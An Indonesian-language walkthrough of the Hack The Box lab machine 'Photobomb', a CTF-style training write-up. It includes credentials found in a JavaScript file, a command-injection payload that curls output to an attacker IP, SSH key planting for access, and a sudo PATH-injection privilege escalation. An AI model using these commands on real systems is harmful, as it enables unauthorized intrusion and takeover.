---
description: Writeup mesin Hack The Box Photobomb
---

# Photobomb

### Port Scanning

Pertama, kita lakukan port scanning pada target.

```bash
sudo nmap -sV -sT -sC -oA nmap_initial photobomb.htb
```

Output dari nmap menunjukkan bahwa port yang terbuka hanya port 80 dan 22.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Photobomb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Sambil kita lakukan full port scan, kita bisa asumsikan bahwa kemungkinan kita akan mendapatkan akses masuk lewat aplikasi yang berada di port 80.

### Web Exploitation

Saat melihat source dari halaman depan aplikasi, kita mendapati file photobomb.js yang dapat diakses melalui url berikut: http://photobomb.htb/photobomb.js

```
http://pH0t0:b0Mb!@photobomb.htb/printer
```

Setelah melakukan fuzzing semua parameter pada fitur Download Photo, saya mengkonfirmasi adanya kerentanan command injection pada parameter **filetype**.

Untuk konfirmasi, pertama kita siapkan terlebih dahulu web server di mesin kita untuk menerima output dari command yang kita kirim.

```bash
python3 -m http.server 5555
```

Lalu pada parameter **filetype**, kita masukkan command

```
/bin/bash -c 'curl http://10.10.14.19:5555/?`uname -a | base64`'
```

Sesuaikan sendiri untuk IP dan portnya dengan IP mesin kalian.

Berikut screenshot saat command injection dikirim melalui Burp Repeater.

<figure><img src="../../.gitbook/assets/1. req.png" alt=""><figcaption></figcaption></figure>

Dan berikut response yang kita terima pada HTTP server yang sudah kita siapkan sebelumnya.

<figure><img src="../../.gitbook/assets/2. resp.png" alt=""><figcaption><p>Command Injection</p></figcaption></figure>

Disitu terlihat hasil dari decode base64 nya adalah output dari command **uname -a** yang kita kirim sebelumnya.

### Get Shell User Access

Setelah mengkonfirmasi adanya kerentanan Command Injection, saya mengubah payload sebelumnya dengan payload reverse shell. Namun entah payload saya yang salah, server mesin Photobomb yang error, atau memang didesain seperti itu, shell yang didapatkan setelah back connect seperti hang dan tidak bisa digunakan untuk menjalankan command apapun.

Solusi akhir yang terpikirkan adalah menambahkan public key SSH dari mesin saya ke server, sehingga saya bisa login ke SSH tanpa menggunakan password.

Referensi: [**SSH Tanpa Password**](https://www.linuxsec.org/2019/10/login-ssh-tanpa-password.html)

```
mkdir ~/.ssh && touch ~/.ssh/authorized_keys && echo "ssh-rsa AAAAB3NzaC1yc2EAAAAD.... some random public key.....4VGJLKPnmAr/hYl haibara@htb" | tee -a ~/.ssh/authorized_keys
```

<figure><img src="../../.gitbook/assets/3. add ssh key.png" alt=""><figcaption></figcaption></figure>

Selanjutnya tinggal login SSH menggunakan key.

<figure><img src="../../.gitbook/assets/4. user pwned.png" alt=""><figcaption></figcaption></figure>

### Get Root Access

Dari user wizard, kita dapat melakukan privilege escalation memanfaatkan path injection. Pertama, kita cek terlebih dahulu apakah user kita dapat menjalankan command sudo tanpa password.

```
sudo -l
```

Output

```
User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Ada "kesalahan" yang bisa kita eksploitasi disini yakni saat mengeksekusi sudo, kita juga dapat mengatur env (**SETENV**), yang nanti dapat kita chaining dengan kesalahan pada scripting file **cleanup.sh**.

Pada file **/opt/cleanup.sh**, baris terakhir memiliki kerentanan path injection dimana perintah path dari **find** tidak di define secara solid sehingga dapat kita manipulasi.

```
# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Cara melakukan privilege escalation dari kerentanan ini:

```bash
echo "/bin/bash -i" | tee /tmp/find
chmod +x /tmp/find
sudo PATH=/tmp/:$PATH /opt/cleanup.sh
```

<figure><img src="../../.gitbook/assets/5. rooted.png" alt=""><figcaption><p>Path Injection</p></figcaption></figure>
